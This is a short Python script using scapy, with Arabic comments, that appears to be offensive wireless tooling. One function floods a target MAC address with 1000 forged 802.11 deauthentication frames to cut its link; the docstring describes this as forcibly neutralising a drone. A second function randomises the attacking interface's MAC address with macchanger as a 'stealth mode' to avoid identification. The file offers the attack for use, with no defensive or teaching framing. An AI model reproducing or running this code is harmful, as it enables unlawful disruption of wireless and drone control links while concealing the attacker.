from scapy.all import *
import os

def signal_jammer_activate(target_mac, interface="wlan0mon"):
    """تحييد قسري للمسيرة عبر حقن حزم قطع الاتصال"""
    # بناء حزمة الهجوم
    dot11 = Dot11(addr1=target_mac, addr2="ff:ff:ff:ff:ff:ff", addr3=target_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    
    # إرسال مستمر لتعطيل الرابط
    sendp(packet, inter=0.01, count=1000, iface=interface, verbose=False)
    return f"Success: Target {target_mac} neutralized and link disrupted."

def stealth_mode_toggle(status=True):
    """تفعيل التخفي عبر تغيير الـ MAC وطلب تشفير المسار"""
    if status:
        os.system("ip link set wlan0mon down")
        os.system("macchanger -r wlan0mon") # يحتاج macchanger مثبت
        os.system("ip link set wlan0mon up")
        return "Stealth Mode: ACTIVE. MAC Address Randomized."
    return "Stealth Mode: DEACTIVATED."
